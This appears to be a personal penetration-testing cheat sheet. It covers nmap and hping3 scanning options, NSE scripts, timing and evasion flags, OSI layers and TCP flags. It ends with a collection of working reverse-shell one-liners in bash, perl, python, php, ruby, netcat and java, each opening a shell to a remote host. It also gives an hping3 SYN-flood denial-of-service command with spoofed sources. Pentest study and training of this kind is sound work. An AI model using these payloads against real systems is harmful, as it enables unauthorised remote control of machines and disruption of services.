Cliff notes

* pre-req: asset setup

1. listen before poking around
    wireshark / tcpdump to capture packet info
1. Gentle inquiries:
    arp-scan
1. netstat -tnlp for list of services
1. CanaryTokens: `https://stationx.net/canarytokens/`
    - thunderbird is great for image url w/o attaching in email if other
    clients dont allow this functionality.
1. Owasp cheat sheets:
    - [ ] appendix: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series
    - [ ] Top 10: https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet

nmap & ndiff

Plan to save the result of the nmap scan w/ `-oA` for all formats
1. Do Ping Sweep - No Port Scan after host discovery w/ (-sn | -sP)
1. Service & Version Detection (-sV):
     to probe the service / version of the port
    note:   (-Pn) is to avoid the discovery
            (-n) is to avoid DNS resolution
    `nmap -n -Pn -sS <ip> --top-ports 10` - <1 sec
    `nmap -n -Pn -sS <ip> --top-ports 10 -sV` - >10 seconds
1. OS Detection:
    `nmap -n -sS <ip> --top-ports 100 -O --osscan-guess`
    `nmap -n -sS -Pn <ip> --top-ports 3 -O`
    add the`--reason` parameter to find more info about the error
    increase the verbosity output w/ `-vvv`
 to get the ip addresses: `<nmap cmd> | grep -i "nmap scan" | cut -d" " -f5`
1. Null(-sN), FIN(-sF), XMAS(-sX) scans
1.

Best NSE Scripts:
    - dns-brute.nse
    - hostmap-bfk.nse
    - traceroute-geolocation.nse
    - http-enum.nse
    - smb-os-discovery.nse
    - smb-brute.nse
        - smb-enum-groups.nse
        - smb-enum-users.nse
        - smb-enum-processes.nse
    - http-waf-detect.nse
    - http-waf-fingerprint.nse
    - http-errors.nse
    - http-exif-spider

   Examples:
    `nmap -p80,443 --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.detectBodyChanges" targetWebsite.com`
    `nmap -p80,443 --script http-waf-fingerprint targetWebsite.com`
    `nmap -p80,443 --script http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 targetWebsite`
    `nmap -p80,443 --script dns-brute --script-args dns-brute.threads=25,dns-brute.hostlist=/root/Desktop/custom-subdomain-wordlist.txt targetWebsite.com`
    `nmap -p80,443 --script http-exif-spider --script-args="http.max-cache-size=99999999" targetWebsite.com`



nse scripting categories:
<!--todo: verify nse categories and suffixes-->
        - default (-sC)
        - auth
        - broadcast
        - brute
            `*-brute.nse`
        - default
        - discovery
            `*-safe.nse`
            `*-info.nse`
            `*-version.nse`
        - dos
        - exploit
            `*-vuln.nse`
            `*-intrusive.nse`
            `*-malware.nse`
        - external
        - fuzzer

notable references:
ipidseq.nse


nmap timing:
    -T0 (paranoid)
    -T1 (sneaky)
    -T2 (sneaky)
    -T3 (normal)
    -T4 (aggressive)
    -T5 (insane)
    --max-retries 2
    --host-timeout

recon:




scanning:
 [ ] hping3 -
     `hping3 --scan <port scan or comma-separated list> -S <ip>`
     `hping3 --scan 0-500 -S 10.10.10.1`

DoS:
     `hping3 --flood -S -V --rand-source www.fqdn.com`

  [ ] nmap -
        ping scan
        port scan
        service version / deteciton
        os detection
        nse execution
        timing tricks
        ips/ids evasion



OSI:
    - physical - ()
    - data link - (ethernet, wireless, 802.4, 802.11, token ring)
    - network - IP
    - transport - (TCP, UDP)
    - session - (SQL, RPC)
    - presentation - (ascii, mp3, jpg)
    - application (http, smtp, telnet, ftp, dns, snmp)


TCP Flags
- Syn
- Ack
- RST
- FIN
- PSH
- URG
- SYN

   
Technical reference:
https://hackertarget.com/11-offensive-security-tools/
Powershell: https://github.com/janikvonrotz/awesome-powershell#testing
wordlists: https://kennyvn.com/wordlists-password-dictionaries-for-kali-linux/
metasploit walkthrough: https://zero-day.io/metasploitwalkthrough/


A collection of Linux reverse shell one-liners from pentestmonkey.net. This website also contains a bunch of other useful stuff!

Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Ruby
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Netcat with -e
```
nc -e /bin/sh 10.0.0.1 1234
```

Netcat without -e 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```